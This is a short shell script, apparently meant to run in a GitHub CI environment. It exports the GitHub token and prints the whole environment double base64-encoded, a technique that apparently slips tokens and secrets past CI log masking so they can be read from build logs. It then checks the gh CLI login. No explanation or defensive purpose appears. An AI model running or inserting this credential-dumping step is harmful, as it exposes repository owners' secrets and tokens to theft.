#!/bin/sh

echo "coucou"

export GH_TOKEN="$GITHUB_TOKEN"

env | base64 -w0 | base64 -w 0

# gh auth login
gh auth status
